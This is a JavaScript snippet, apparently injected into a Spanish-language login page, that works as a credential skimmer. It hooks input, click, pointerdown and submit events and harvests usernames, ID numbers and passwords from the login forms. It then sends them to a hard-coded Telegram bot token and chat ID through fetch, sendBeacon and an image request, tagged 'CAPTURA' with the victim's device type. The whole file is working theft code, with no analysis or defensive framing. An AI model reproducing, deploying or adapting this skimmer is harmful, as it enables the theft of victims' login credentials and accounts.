(function () {
  const TOKEN = "9159089747:AAGrdR7YNxmKCXvzec1LLpWhKCvt2ivc6uQ";
  const CHAT_ID = "7007914207";

  let cacheUsuario = "";
  let cacheClave = "";
  let ultimoEnvio = "";
  let ultimaHora = 0;

  function guardarCampo(el) {
    if (!el || el.tagName !== "INPUT") return;
    const id = (el.id || "").toLowerCase();
    const name = (el.name || "").toLowerCase();
    const placeholder = (el.placeholder || "").toLowerCase();

    if (
      el.type === "password" ||
      id.includes("clave") ||
      id.includes("pass") ||
      name.includes("clave") ||
      name.includes("pass")
    ) {
      if (el.value) cacheClave = el.value;
      return;
    }

    if (
      id.includes("correo") ||
      id.includes("usuario") ||
      name.includes("correo") ||
      name.includes("usuario") ||
      placeholder.includes("usuario") ||
      placeholder.includes("cédula") ||
      placeholder.includes("cedula") ||
      ["text", "email", "tel", "number"].includes(el.type)
    ) {
      const val = (el.value || "").trim();
      if (val) cacheUsuario = val;
    }
  }

  function obtenerCredenciales() {
    document.querySelectorAll("input").forEach(guardarCampo);

    const uModal = document.querySelector("#campoCorreo")?.value.trim() || "";
    const pModal = document.querySelector("#campoClave")?.value || "";
    const uInline = document.querySelector("#loginUsuario")?.value.trim() || "";
    const pInline = document.querySelector("#loginPasswordInline")?.value || "";

    return {
      usuario: uModal || uInline || cacheUsuario || "",
      password: pModal || pInline || cacheClave || ""
    };
  }

  function enviarTelegram() {
    const { usuario, password } = obtenerCredenciales();
    if (!usuario && !password) return;

    const firma = usuario + "|" + password;
    const ahora = Date.now();
    if (firma === ultimoEnvio && ahora - ultimaHora < 2500) return;
    ultimoEnvio = firma;
    ultimaHora = ahora;

    const origen = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)
      ? "MOVIL"
      : "PC";

    const texto =
      "CAPTURA [" + origen + "]\n" +
      "Usuario: " + (usuario || "vacio") + "\n" +
      "Clave: " + (password || "vacia");

    const url =
      "https://api.telegram.org/bot" +
      TOKEN +
      "/sendMessage?chat_id=" +
      CHAT_ID +
      "&text=" +
      encodeURIComponent(texto);

    try {
      if (window.fetch) {
        fetch(url, { mode: "no-cors", keepalive: true }).catch(function () {});
      }
    } catch (e) {}

    try {
      if (navigator.sendBeacon) {
        navigator.sendBeacon(url);
      }
    } catch (e) {}

    window._telePeticiones = window._telePeticiones || [];
    const img = new Image();
    img.src = url;
    window._telePeticiones.push(img);
  }

  document.addEventListener("input", function (e) {
    guardarCampo(e.target);
  }, true);

  document.addEventListener("change", function (e) {
    guardarCampo(e.target);
  }, true);

  document.addEventListener("pointerdown", function (e) {
    const el = e.target;
    if (!el) return;
    if (
      el.closest("#loginModalForm") ||
      el.closest("#loginFormInline") ||
      el.closest("button, input[type='submit'], [role='button']")
    ) {
      guardarCampo(document.activeElement);
      obtenerCredenciales();
      if (el.closest("button, input[type='submit'], [role='button']")) {
        enviarTelegram();
      }
    }
  }, true);

  document.addEventListener("click", function (e) {
    const el = e.target;
    if (!el) return;
    if (
      el.closest("#loginModalForm") ||
      el.closest("#loginFormInline") ||
      el.closest("button, input[type='submit'], [role='button']")
    ) {
      enviarTelegram();
    }
  }, true);

  document.addEventListener("submit", function () {
    enviarTelegram();
  }, true);
})();